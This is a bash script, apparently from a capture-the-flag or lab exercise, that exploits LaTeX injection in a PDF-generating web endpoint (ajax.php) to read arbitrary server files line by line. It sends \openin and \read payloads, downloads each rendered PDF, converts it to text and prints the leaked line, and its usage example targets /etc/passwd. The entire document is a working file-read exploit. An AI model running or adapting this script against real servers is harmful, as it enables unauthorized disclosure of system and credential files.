#!/bin/bash 
 
# Global Vars 

declare -r url="http://localhost/ajax.php"
filename=$1

if [ $filename ]; then
	line="%0A\read\file%20to\line"
  for i in $(seq 1 100);do 

	file_to_download=$(curl -s -X POST $url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$line%0A\text{\line}%0A\closein\file&template=blank" | /usr/bin/grep -i download | /usr/bin/awk 'NF{print $NF}')
  
	if [ $file_to_download ]; then 
	  wget $file_to_download &>/dev/null 
  
	  file_to_convert=$(echo $file_to_download | /usr/bin/tr '/' ' ' | /usr/bin/awk 'NF{print $NF}')
	  /usr/bin/pdftotext $file_to_convert 
  
	  file_to_read=$(echo $file_to_convert | /usr/bin/sed 's/\.pdf/\.txt/')
	  rm $file_to_convert 
	  /usr/bin/cat $file_to_read | /usr/bin/head -n 1
	  rm $file_to_read
	  line+="%0A\read\file%20to\line"
	else 
	  line+="%0A\read\file%20to\line"
	fi
  done 
else 
  echo -e "\n\n\t[!] Usage: $0 /etc/passwd\n\n"
fi 

